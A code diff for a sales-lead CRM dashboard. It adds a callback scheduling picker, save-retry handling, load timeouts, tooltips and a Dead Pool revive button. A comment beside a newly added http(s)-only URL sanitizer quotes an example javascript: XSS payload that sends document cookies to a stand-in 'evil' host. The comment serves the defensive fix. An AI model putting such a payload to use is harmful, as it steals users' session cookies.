@@ -74,6 +74,14 @@
         .stat-label { font-size: 11px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--text-secondary); margin-bottom: 8px; }
         .stat-value { font-family: var(--font-display); font-weight: 700; font-size: 26px; color: var(--text-primary); }
         .stat-hint { margin-top: 4px; font-size: 11px; color: var(--text-muted); }
+        .help-tip {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 14px; height: 14px; margin-left: 6px;
+            border-radius: 50%; background: rgba(255,255,255,0.08);
+            color: var(--text-muted); font-size: 10px; font-weight: 700;
+            cursor: help; vertical-align: middle;
+        }
+        .help-tip:hover { background: rgba(37,99,235,0.18); color: var(--blue); }
 
         /* Lead drawer */
         .lead-drawer-overlay {
@@ -83,11 +91,18 @@
         .lead-drawer-overlay.open { opacity: 1; pointer-events: auto; }
         .lead-drawer {
             position: fixed; top: 0; right: 0; height: 100vh;
-            width: 60vw; min-width: 520px; max-width: 100vw;
+            width: 60vw; max-width: 100vw;
             background: var(--bg-card); border-left: 1px solid var(--border-subtle);
             box-shadow: -16px 0 40px rgba(0,0,0,0.4);
             transform: translateX(100%); transition: transform 220ms cubic-bezier(.4,0,.2,1);
             overflow-y: auto; z-index: 100; padding: 28px 36px 80px;
+        }
+        @media (max-width: 540px) {
+            .lead-drawer { width: 100vw; padding: 22px 22px 80px; }
+            .drawer h2 { font-size: 20px; }
+        }
+        @media (min-width: 541px) and (max-width: 1024px) {
+            .lead-drawer { width: 75vw; }
         }
         .lead-drawer.open { transform: translateX(0); }
         .drawer-close {
@@ -141,6 +156,39 @@
         }
         .history-row:first-child { border-top: 0; }
         .history-meta { color: var(--text-muted); font-size: 11px; margin-top: 4px; }
+
+        /* Callback pill picker */
+        .pick-row { display: flex; gap: 6px; flex-wrap: wrap; margin: 6px 0 10px; }
+        .pill {
+            padding: 7px 12px; border-radius: 999px; font-size: 12px;
+            background: transparent; border: 1px solid var(--border-medium);
+            color: var(--text-secondary); cursor: pointer; transition: background 120ms;
+            font-family: inherit;
+        }
+        .pill:hover { background: var(--bg-elevated); color: var(--text-primary); }
+        .pill.active {
+            background: rgba(37,99,235,0.18); color: var(--blue);
+            border-color: rgba(37,99,235,0.55);
+        }
+        .pick-summary {
+            font-size: 12px; color: var(--text-secondary);
+            padding: 8px 12px; background: rgba(37,99,235,0.06);
+            border: 1px solid rgba(37,99,235,0.18); border-radius: 8px; margin: 6px 0 10px;
+        }
+        .pick-summary.empty { background: transparent; border-style: dashed; color: var(--text-muted); }
+
+        /* Inline retry toast for failed PATCH writes */
+        .save-toast {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            background: #1f1208; border: 1px solid #d97706; color: #fbbf24;
+            padding: 12px 18px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            display: flex; align-items: center; gap: 14px; z-index: 200;
+            font-size: 13px; font-weight: 500;
+        }
+        .save-toast button {
+            background: #fbbf24; color: #1f1208; border: 0; padding: 6px 14px;
+            border-radius: 6px; font-weight: 700; font-size: 12px; cursor: pointer;
+        }
 
         .tabs { display: flex; gap: 4px; border-bottom: 1px solid var(--border-subtle); margin-bottom: 16px; flex-wrap: wrap; }
         .tab {
@@ -232,22 +280,22 @@
 
             <div class="stat-row">
                 <div class="stat-card active" data-filter="all" data-tier="all" onclick="setStatFilter('all')">
-                    <div class="stat-label">All leads</div>
+                    <div class="stat-label">All leads <span class="help-tip" title="All leads except those you've moved to Dead Pool. Tier (Hot / Warm / Cool) is auto-scored from Google rating + review count: HOT needs 4.5+ rating AND 50+ reviews. WARM needs 4.3+ rating OR 100+ reviews. Anything else is COOL. You can override per-lead in the drawer.">ⓘ</span></div>
                     <div class="stat-value" id="statAll">—</div>
                     <div class="stat-hint">Click to clear filter</div>
                 </div>
                 <div class="stat-card" data-filter="called-today" data-tier="called-today" onclick="setStatFilter('called-today')">
-                    <div class="stat-label">Called Today</div>
+                    <div class="stat-label">Called Today <span class="help-tip" title="Leads where you logged at least one call since midnight your local time. Resets each calendar day.">ⓘ</span></div>
                     <div class="stat-value" id="statCalledToday">—</div>
-                    <div class="stat-hint">Leads dialed in the last 24h</div>
+                    <div class="stat-hint">Leads dialed since midnight</div>
                 </div>
                 <div class="stat-card" data-filter="signed" data-tier="signed" onclick="setStatFilter('signed')">
-                    <div class="stat-label">Clients Signed</div>
+                    <div class="stat-label">Clients Signed <span class="help-tip" title="Lifetime count of leads you marked as 'Signed as client' in the outcome dropdown. Doesn't decrease when David refreshes the lead list — these are your closed deals.">ⓘ</span></div>
                     <div class="stat-value" id="statSigned">—</div>
                     <div class="stat-hint">Lifetime closed deals</div>
                 </div>
                 <div class="stat-card" data-filter="dead" data-tier="dead" onclick="setStatFilter('dead')">
-                    <div class="stat-label">Dead Pool</div>
+                    <div class="stat-label">Dead Pool <span class="help-tip" title="Leads you flagged as not worth calling. Auto-set when outcome is Not interested / DNC / Wrong number. Open a dead lead in the drawer to revive it back to your callable pool.">ⓘ</span></div>
                     <div class="stat-value" id="statDead">—</div>
                     <div class="stat-hint">Marked as not worth calling</div>
                 </div>
@@ -428,14 +476,9 @@
                 +     '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>'
                 +     'My agents'
                 +   '</a>'
-                +   '<a href="/app/billing.html" style="display:flex;align-items:center;gap:10px;padding:10px 14px;font-size:13px;color:inherit;text-decoration:none;border-radius:8px;">'
-                +     '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>'
-                +     'Billing & purchases'
-                +   '</a>'
-                +   '<a href="mailto:support@stiloaipartners.com" style="display:flex;align-items:center;gap:10px;padding:10px 14px;font-size:13px;color:inherit;text-decoration:none;border-radius:8px;">'
-                +     '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>'
-                +     'Support'
-                +   '</a>'
+                // Billing and Support links removed pre-launch — pages
+                // don't exist yet. Re-add when /app/billing.html ships
+                // and the support@ mailbox is monitored.
                 +   '<div style="height:1px;background:var(--border-subtle);margin:6px 0;"></div>'
                 +   '<button onclick="userMenuSignOut()" style="display:flex;align-items:center;gap:10px;width:100%;text-align:left;background:transparent;border:0;padding:10px 14px;font-size:13px;color:#ef4444;cursor:pointer;border-radius:8px;">'
                 +     '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>'
@@ -593,6 +636,10 @@
             clearTimeout(_stateSaveTimer);
             _stateSaveTimer = setTimeout(flushCrmPatch, 400);
         }
+        // Pending patches that failed and need a retry. Each entry is the
+        // full pending blob so we can re-merge from local state. Drained in
+        // FIFO order on retry-button click.
+        var _failedPatches = [];
         async function flushCrmPatch() {
             var pending = window.__crmPending;
             window.__crmPending = null;
@@ -608,8 +655,46 @@
                 if (!resp.ok) {
                     var j = await resp.json().catch(function(){ return {}; });
                     console.warn('[crm save]', resp.status, j);
+                    _failedPatches.push(pending);
+                    showSaveToast('Couldn’t save your last change. We kept it locally — tap Retry.');
                 }
-            } catch (e) { console.warn('[crm save]', e); }
+            } catch (e) {
+                console.warn('[crm save]', e);
+                _failedPatches.push(pending);
+                showSaveToast('Network issue saving your last change. Tap Retry when you’re back online.');
+            }
+        }
+
+        function showSaveToast(msg) {
+            var existing = document.getElementById('saveToast');
+            if (existing) existing.remove();
+            var bar = document.createElement('div');
+            bar.id = 'saveToast';
+            bar.className = 'save-toast';
+            bar.innerHTML = '<span>' + esc(msg) + '</span><button type="button" onclick="retryFailedPatches()">Retry</button>';
+            document.body.appendChild(bar);
+        }
+        function hideSaveToast() {
+            var existing = document.getElementById('saveToast');
+            if (existing) existing.remove();
+        }
+        async function retryFailedPatches() {
+            if (!_failedPatches.length) { hideSaveToast(); return; }
+            var btn = document.querySelector('#saveToast button');
+            if (btn) { btn.disabled = true; btn.textContent = 'Retrying…'; }
+            // Drain the queue back into __crmPending and flush. If it still
+            // fails the queue refills and the toast remains.
+            var merged = _failedPatches.reduce(function (acc, p) {
+                ['tier_overrides','call_logs','callbacks','booked','signed'].forEach(function (k) {
+                    if (p[k]) acc[k] = Object.assign(acc[k] || {}, p[k]);
+                });
+                return acc;
+            }, {});
+            _failedPatches = [];
+            window.__crmPending = merged;
+            await flushCrmPatch();
+            if (_failedPatches.length === 0) hideSaveToast();
+            if (btn) { btn.disabled = false; btn.textContent = 'Retry'; }
         }
 
         // Effective tier for a lead = manual override if set, else auto-tier.
@@ -627,12 +712,16 @@
             return 'callable';
         }
 
-        // Was this lead called within the last 24h?
+        // Was this lead called today (Marcus's local calendar day)?
+        // Previously used a 24h sliding window which silently dropped a
+        // call from 8am as soon as the clock crossed 8am the next day.
+        // Marcus thinks of "today" as a calendar day; this matches.
         function calledInLast24h(lead) {
             var logs = crmState.call_logs[lead.lead_key] || [];
             if (!logs.length) return false;
-            var cutoff = Date.now() - 24 * 60 * 60 * 1000;
-            return logs.some(function (l) { return new Date(l.at).getTime() >= cutoff; });
+            var cutoff = new Date(); cutoff.setHours(0, 0, 0, 0);
+            var t = cutoff.getTime();
+            return logs.some(function (l) { return new Date(l.at).getTime() >= t; });
         }
 
         // Sort order: HOT first, then WARM, then COOL. Within each tier,
@@ -656,11 +745,18 @@
                 try {
                     var token = clientState.session && clientState.session.access_token;
                     var url = '/api/client-leads?client_id=' + encodeURIComponent(clientState.clientId);
-                    var resp = await fetch(url, { headers: { 'Authorization': 'Bearer ' + token } });
+                    // 15s timeout via AbortController so a stuck GCS fetch
+                    // doesn't leave Marcus staring at a spinner forever.
+                    var ctrl = new AbortController();
+                    var timeoutId = setTimeout(function () { ctrl.abort(); }, 15000);
+                    var resp;
+                    try {
+                        resp = await fetch(url, { headers: { 'Authorization': 'Bearer ' + token }, signal: ctrl.signal });
+                    } finally { clearTimeout(timeoutId); }
                     var data = await resp.json();
                     if (!resp.ok) {
                         console.error('[client-leads]', data);
-                        showEmpty('Could not load leads: ' + (data.error || resp.status) + (data.detail ? ' — ' + data.detail : ''));
+                        showEmptyWithRetry('Could not load leads: ' + (data.error || resp.status) + (data.detail ? ' — ' + data.detail : ''));
                         return;
                     }
                     leadsCache = data.results || [];
@@ -670,7 +766,10 @@
                         srcEl.textContent = data.count + ' leads · synced ' + dt;
                     }
                 } catch (e) {
-                    showEmpty('Network error loading leads: ' + (e.message || e));
+                    var msg = (e && e.name === 'AbortError')
+                        ? 'Loading your leads is taking longer than 15s. Network or GCS is slow.'
+                        : 'Network error loading leads: ' + (e.message || e);
+                    showEmptyWithRetry(msg);
                     return;
                 }
             }
@@ -741,15 +840,24 @@
                 return true;
             });
 
-            // 4. Priority sort (HOT > WARM > COOL > DEAD; tie-break by rating then review_count)
-            filtered.sort(leadComparator);
+            // 4. Sort. Call Back tab orders by callback time ASC (next call
+            //    to make at the top). Other tabs use tier priority + rating.
+            if (uiFilter.bucket === 'callbacks') {
+                filtered.sort(function (a, b) {
+                    var ta = (crmState.callbacks[a.lead_key] || {}).at || '';
+                    var tb = (crmState.callbacks[b.lead_key] || {}).at || '';
+                    return ta.localeCompare(tb);
+                });
+            } else {
+                filtered.sort(leadComparator);
+            }
 
             // 5. Render table or empty
             if (!filtered.length) {
                 showEmpty('No leads in this view. Adjust the filter to see more.');
                 return;
             }
-            renderLeadsTable(filtered);
+            renderLeadsTable(filtered, uiFilter.bucket);
         }
 
         function setText(id, val) {
@@ -764,10 +872,178 @@
             if (body && msg) body.textContent = msg;
         }
 
+        // Same as showEmpty but with a "Try again" button — used when the
+        // GCS fetch fails or times out so Marcus can self-recover without
+        // refreshing the whole page.
+        function showEmptyWithRetry(msg) {
+            showEmpty(msg);
+            var body = document.getElementById('emptyStateBody');
+            if (!body) return;
+            // Replace any existing retry button before appending a new one
+            var existing = document.getElementById('emptyRetryBtn');
+            if (existing) existing.remove();
+            var btn = document.createElement('button');
+            btn.id = 'emptyRetryBtn';
+            btn.textContent = 'Try again';
+            btn.style.cssText = 'margin-top:14px;padding:8px 16px;background:var(--blue-strong);color:white;border:0;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;';
+            btn.onclick = function () {
+                btn.disabled = true; btn.textContent = 'Retrying…';
+                leadsCache = null;
+                refreshLeadsView();
+            };
+            body.appendChild(document.createElement('br'));
+            body.appendChild(btn);
+        }
+
         function esc(s) {
             return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
                 return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
             });
+        }
+
+        // Conservative URL sanitizer: only allow http/https schemes for
+        // anything we render as a clickable link. Prevents XSS via
+        // `javascript:` or `data:` URLs from arbitrary lead website
+        // values that David's scraper might pick up.
+        function isSafeUrl(u) {
+            if (!u) return false;
+            var s = String(u).trim();
+            return /^https?:\/\//i.test(s);
+        }
+
+        // ---- Callback pill picker -------------------------------------
+        // pickerDraft holds the "in-progress" callback choice while the
+        // drawer is open. Submitted on Save call log. Stores ISO local-
+        // time strings ("YYYY-MM-DDTHH:mm:00") so re-renders can show
+        // pre-selected pills, and so we don't depend on Date parsing of
+        // partial strings.
+        var pickerDraft = { date: null, time: null };
+
+        // 7 date pills: today + the next 6 business days (skip Sat/Sun).
+        function buildDateOptions() {
+            var out = [];
+            var d = new Date(); d.setHours(0, 0, 0, 0);
+            while (out.length < 7) {
+                var day = d.getDay();
+                if (day !== 0 && day !== 6) {
+                    out.push({
+                        iso: toLocalIsoDate(d),
+                        label: dateLabel(d, out.length)
+                    });
+                }
+                d.setDate(d.getDate() + 1);
+            }
+            return out;
+        }
+        function dateLabel(d, idx) {
+            if (idx === 0) return 'Today';
+            if (idx === 1) return 'Tomorrow';
+            var weekday = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'][d.getDay()];
+            return weekday + ' ' + (d.getMonth() + 1) + '/' + d.getDate();
+        }
+        function toLocalIsoDate(d) {
+            // YYYY-MM-DD using local clock (not UTC, which can shift the day).
+            var y = d.getFullYear();
+            var m = String(d.getMonth() + 1).padStart(2, '0');
+            var dd = String(d.getDate()).padStart(2, '0');
+            return y + '-' + m + '-' + dd;
+        }
+        var TIME_OPTIONS = [
+            { value: '09:00', label: '9 AM' },
+            { value: '10:00', label: '10 AM' },
+            { value: '11:00', label: '11 AM' },
+            { value: '12:00', label: '12 PM' },
+            { value: '13:00', label: '1 PM' },
+            { value: '14:00', label: '2 PM' },
+            { value: '15:00', label: '3 PM' },
+            { value: '16:00', label: '4 PM' },
+            { value: '17:00', label: '5 PM' }
+        ];
+
+        // Render the picker as part of the drawer body. If a callback is
+        // already scheduled for this lead, pre-select its date/time pills.
+        function renderCallbackPicker(lead, callbackAt) {
+            // Initialize the draft from existing callback, if any
+            if (callbackAt && callbackAt.at) {
+                try {
+                    var existing = new Date(callbackAt.at);
+                    if (!isNaN(existing.getTime())) {
+                        pickerDraft.date = toLocalIsoDate(existing);
+                        pickerDraft.time = String(existing.getHours()).padStart(2,'0') + ':' + String(existing.getMinutes()).padStart(2,'0');
+                    }
+                } catch (e) {}
+            } else {
+                pickerDraft.date = null;
+                pickerDraft.time = null;
+            }
+            var dates = buildDateOptions();
+            var datePills = dates.map(function (d) {
+                var active = pickerDraft.date === d.iso ? ' active' : '';
+                return '<button type="button" class="pill' + active + '" onclick="pickDate(\'' + d.iso + '\')">' + esc(d.label) + '</button>';
+            }).join('');
+            var timePills = TIME_OPTIONS.map(function (t) {
+                var active = pickerDraft.time === t.value ? ' active' : '';
+                return '<button type="button" class="pill' + active + '" onclick="pickTime(\'' + t.value + '\')">' + esc(t.label) + '</button>';
+            }).join('');
+            return ''
+                + '<div style="font-size:11px;color:var(--text-secondary);margin-top:2px;">Date</div>'
+                + '<div class="pick-row" id="pickDateRow">' + datePills + '</div>'
+                + '<div style="font-size:11px;color:var(--text-secondary);">Time</div>'
+                + '<div class="pick-row" id="pickTimeRow">' + timePills + '</div>'
+                + '<div class="pick-summary' + (pickerDraft.date && pickerDraft.time ? '' : ' empty') + '" id="pickSummary">'
+                +   (pickerDraft.date && pickerDraft.time
+                       ? '✓ Scheduled for ' + esc(formatPickerSummary(pickerDraft.date, pickerDraft.time))
+                       : 'Pick a date and time above. Only saves when you set the outcome to "Callback requested" and hit Save.')
+                + '</div>';
+        }
+        function formatPickerSummary(dateIso, timeHm) {
+            try {
+                var d = new Date(dateIso + 'T' + timeHm + ':00');
+                if (isNaN(d.getTime())) return '';
+                var opts = { weekday: 'short', month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' };
+                return d.toLocaleString(undefined, opts);
+            } catch (e) { return ''; }
+        }
+        function pickDate(iso) {
+            pickerDraft.date = iso;
+            refreshPickerSelections();
+        }
+        function pickTime(hm) {
+            pickerDraft.time = hm;
+            refreshPickerSelections();
+        }
+        function refreshPickerSelections() {
+            var dateRow = document.getElementById('pickDateRow');
+            var timeRow = document.getElementById('pickTimeRow');
+            if (dateRow) {
+                Array.from(dateRow.querySelectorAll('.pill')).forEach(function (btn) {
+                    var iso = (btn.getAttribute('onclick') || '').match(/pickDate\('([^']+)'\)/);
+                    btn.classList.toggle('active', !!(iso && iso[1] === pickerDraft.date));
+                });
+            }
+            if (timeRow) {
+                Array.from(timeRow.querySelectorAll('.pill')).forEach(function (btn) {
+                    var hm = (btn.getAttribute('onclick') || '').match(/pickTime\('([^']+)'\)/);
+                    btn.classList.toggle('active', !!(hm && hm[1] === pickerDraft.time));
+                });
+            }
+            var sum = document.getElementById('pickSummary');
+            if (sum) {
+                if (pickerDraft.date && pickerDraft.time) {
+                    sum.className = 'pick-summary';
+                    sum.textContent = '✓ Scheduled for ' + formatPickerSummary(pickerDraft.date, pickerDraft.time);
+                } else {
+                    sum.className = 'pick-summary empty';
+                    sum.textContent = 'Pick a date and time above. Only saves when you set the outcome to "Callback requested" and hit Save.';
+                }
+            }
+        }
+        // Convert the picker draft to an ISO timestamp (UTC) for storage.
+        function pickerDraftToIso() {
+            if (!pickerDraft.date || !pickerDraft.time) return null;
+            var local = new Date(pickerDraft.date + 'T' + pickerDraft.time + ':00');
+            if (isNaN(local.getTime())) return null;
+            return local.toISOString();
         }
 
         function tierPillHtml(t) {
@@ -809,18 +1085,24 @@
             }, 120);
         }
 
-        function renderLeadsTable(rows) {
+        function renderLeadsTable(rows, bucket) {
             document.getElementById('emptyState').style.display = 'none';
             var host = document.getElementById('leadsTable');
             host.style.display = 'block';
             // Rating column dropped per Remy 2026-05-11 — rating is visible
             // inside the drawer when Marcus clicks a row. Keeping it in the
             // table made the row too dense.
+            //
+            // Call Back tab gets an extra "When" column (the scheduled
+            // callback time) so Marcus sees the next call to make without
+            // opening every drawer.
+            var showCallbackCol = bucket === 'callbacks';
             var ths = '<tr>'
                 + '<th style="width:1px;">Tier</th>'
                 + '<th>Business</th>'
                 + '<th style="width:1px;">Phone</th>'
                 + '<th>Address</th>'
+                + (showCallbackCol ? '<th style="width:1px;">Callback</th>' : '')
                 + '<th style="width:1px;">Last call</th>'
                 + '</tr>';
             var body = rows.map(function (r) {
@@ -829,6 +1111,17 @@
                 var lastTxt = lastLog
                     ? (new Date(lastLog.at).toLocaleDateString() + ' · ' + esc(lastLog.outcome || ''))
                     : '<span style="color:var(--text-muted);">—</span>';
+                var callbackTxt = '';
+                if (showCallbackCol) {
+                    var cb = crmState.callbacks[r.lead_key];
+                    var cbTxt = '<span style="color:var(--text-muted);">—</span>';
+                    if (cb && cb.at) {
+                        var cbDate = new Date(cb.at);
+                        var overdue = cbDate.getTime() < Date.now();
+                        cbTxt = '<span style="color:' + (overdue ? '#ef4444' : 'var(--text-primary)') + ';font-weight:' + (overdue ? '700' : '500') + ';">' + esc(cbDate.toLocaleString(undefined, { weekday: 'short', month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' })) + (overdue ? ' · OVERDUE' : '') + '</span>';
+                    }
+                    callbackTxt = '<td style="font-size:12px;white-space:nowrap;">' + cbTxt + '</td>';
+                }
                 return '<tr onclick="openLeadDrawer(\'' + esc(r.lead_key) + '\')" style="cursor:pointer;">'
                     + '<td style="white-space:nowrap;">' + tierPillHtml(t) + '</td>'
                     + '<td><strong>' + esc(r.business_name) + '</strong>'
@@ -836,6 +1129,7 @@
                       + '</td>'
                     + '<td style="font-family:var(--font-mono);white-space:nowrap;">' + esc(r.phone || '—') + '</td>'
                     + '<td style="color:var(--text-secondary);font-size:12px;max-width:340px;">' + esc(r.address || '—') + '</td>'
+                    + callbackTxt
                     + '<td style="color:var(--text-muted);font-size:12px;white-space:nowrap;">' + lastTxt + '</td>'
                     + '</tr>';
             }).join('');
@@ -857,12 +1151,29 @@
             renderDrawerBody(lead);
             document.getElementById('leadDrawer').classList.add('open');
             document.getElementById('drawerOverlay').classList.add('open');
+            // B10: prevent the underlying lead list from scrolling under
+            // the drawer (especially noticeable on mobile where it feels
+            // jarring while Marcus is typing into the call log).
+            document.body.style.overflow = 'hidden';
         }
         function closeLeadDrawer() {
             document.getElementById('leadDrawer').classList.remove('open');
             document.getElementById('drawerOverlay').classList.remove('open');
             currentDrawerKey = null;
+            document.body.style.overflow = '';
+            // Reset the picker draft so the next drawer doesn't show
+            // someone else's half-picked time.
+            pickerDraft = { date: null, time: null };
         }
+
+        // B6: Escape key closes the drawer. Single global listener wired
+        // once at script init — drawer state is in currentDrawerKey so
+        // there's nothing to bind/unbind per open.
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape' && currentDrawerKey) {
+                closeLeadDrawer();
+            }
+        });
 
         function renderDrawerBody(lead) {
             var t = effectiveTier(lead);
@@ -895,7 +1206,17 @@
             var callbackAt = crmState.callbacks[lead.lead_key];
             var signedAt = crmState.signed[lead.lead_key];
 
-            document.getElementById('drawerBody').innerHTML =
+            // B5: when a lead is in Dead Pool, show a prominent Revive
+            // button at the top of the drawer. Clicking it sends a
+            // tombstone for the tier override (null) so the lead falls
+            // back to its auto-tier and reappears in callable buckets.
+            var reviveBanner = (t === 'dead')
+                ? '<div style="margin-bottom:18px;padding:12px 14px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.30);border-radius:10px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;">'
+                    + '<div style="font-size:13px;color:#fca5a5;">This lead is in your Dead Pool.</div>'
+                    + '<button type="button" onclick="reviveLead(\'' + esc(lead.lead_key) + '\')" style="background:#ef4444;color:white;border:0;padding:8px 14px;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;">Revive lead</button>'
+                  + '</div>'
+                : '';
+            document.getElementById('drawerBody').innerHTML = reviveBanner +
                 '<div style="font-size:11px;letter-spacing:0.08em;text-transform:uppercase;color:var(--text-secondary);">' + esc(lead.niche || 'Lead') + '</div>'
                 + '<h2>' + esc(lead.business_name) + '</h2>'
                 + '<div style="margin-top:6px;font-size:13px;color:var(--text-secondary);">' + esc(ratingTxt) + '</div>'
@@ -918,7 +1239,13 @@
                 + (website
                     ? '<div class="drawer-section">'
                       + '<h3>Website</h3>'
-                      + '<a target="_blank" rel="noopener" href="' + esc(website) + '" style="font-size:13px;color:var(--blue);word-break:break-all;">' + esc(website) + '</a>'
+                      // Hard-require http(s):// scheme. esc() escapes HTML but
+                      // doesn't sanitize URL schemes — a lead with
+                      // website="javascript:fetch('//evil/?c='+document.cookie)"
+                      // would render as a clickable XSS payload otherwise.
+                      + (isSafeUrl(website)
+                          ? '<a target="_blank" rel="noopener" href="' + esc(website) + '" style="font-size:13px;color:var(--blue);word-break:break-all;">' + esc(website) + '</a>'
+                          : '<div style="font-size:13px;color:var(--text-muted);word-break:break-all;">' + esc(website) + '</div>')
                     + '</div>'
                     : '')
 
@@ -945,8 +1272,8 @@
                     + '</select>'
                     + '<label>Notes</label>'
                     + '<textarea id="logNotes" placeholder="Who answered, next move, anything you want to remember…"></textarea>'
-                    + '<label>Callback (if applicable)</label>'
-                    + '<input id="logCallback" type="datetime-local" />'
+                    + '<label>Callback schedule</label>'
+                    + renderCallbackPicker(lead, callbackAt)
                     + '<button type="button" class="drawer-btn-primary" onclick="submitLogCall(\'' + esc(lead.lead_key) + '\')">Save call log</button>'
                   + '</div>'
                 + '</div>'
@@ -964,6 +1291,20 @@
                   + '<h3>Call history</h3>'
                   + historyHtml
                 + '</div>';
+        }
+
+        // B5: Pull a lead back out of Dead Pool. Sends a tombstone
+        // (`tier_overrides: { [key]: null }`) so the lead falls back to
+        // its auto-tier and reappears in the callable buckets. The state
+        // endpoint already supports null deletion.
+        function reviveLead(leadKey) {
+            delete crmState.tier_overrides[leadKey];
+            var patch = { tier_overrides: {} };
+            patch.tier_overrides[leadKey] = null;
+            saveCrmPatch(patch);
+            var lead = (leadsCache || []).find(function (l) { return l.lead_key === leadKey; });
+            if (lead) renderDrawerBody(lead);
+            renderEverything();
         }
 
         function setLeadTier(leadKey, tier) {
@@ -989,7 +1330,10 @@
         function submitLogCall(leadKey) {
             var outcome = (document.getElementById('logOutcome') || {}).value || 'no_answer';
             var notes = (document.getElementById('logNotes') || {}).value || '';
-            var callbackVal = (document.getElementById('logCallback') || {}).value || '';
+            // Callback datetime now comes from the pill picker, not a native
+            // datetime-local input. pickerDraftToIso() returns null if the
+            // user hasn't picked both date AND time.
+            var callbackIso = pickerDraftToIso();
 
             var entry = { at: new Date().toISOString(), outcome: outcome, notes: notes };
             crmState.call_logs[leadKey] = crmState.call_logs[leadKey] || [];
@@ -998,17 +1342,17 @@
             var patch = { call_logs: {} };
             patch.call_logs[leadKey] = crmState.call_logs[leadKey];
 
-            // Outcome-driven side effects: book a meeting, schedule callback,
-            // mark as signed, or move lead to Dead Pool. Mirrors STILO's
-            // own admin CRM so behavior is consistent across dashboards.
+            // Outcome-driven side effects. Picker reused for both
+            // booked_meeting and callback_requested so Marcus only has one
+            // UI to learn. signed/dnc/etc. ignore the picker.
             if (outcome === 'signed') {
                 crmState.signed[leadKey] = { at: new Date().toISOString() };
                 patch.signed = {}; patch.signed[leadKey] = crmState.signed[leadKey];
             } else if (outcome === 'booked_meeting') {
-                crmState.booked[leadKey] = { at: callbackVal ? new Date(callbackVal).toISOString() : new Date().toISOString() };
+                crmState.booked[leadKey] = { at: callbackIso || new Date().toISOString() };
                 patch.booked = {}; patch.booked[leadKey] = crmState.booked[leadKey];
-            } else if (outcome === 'callback_requested' && callbackVal) {
-                crmState.callbacks[leadKey] = { at: new Date(callbackVal).toISOString() };
+            } else if (outcome === 'callback_requested' && callbackIso) {
+                crmState.callbacks[leadKey] = { at: callbackIso };
                 patch.callbacks = {}; patch.callbacks[leadKey] = crmState.callbacks[leadKey];
             } else if (outcome === 'not_interested' || outcome === 'dnc' || outcome === 'wrong_number') {
                 crmState.tier_overrides[leadKey] = 'dead';
@@ -1019,6 +1363,9 @@
                 patch.booked = {}; patch.booked[leadKey] = null;
             }
             saveCrmPatch(patch);
+
+            // Reset picker so the next drawer open starts clean
+            pickerDraft = { date: null, time: null };
 
             var lead = (leadsCache || []).find(function (l) { return l.lead_key === leadKey; });
             if (lead) renderDrawerBody(lead);
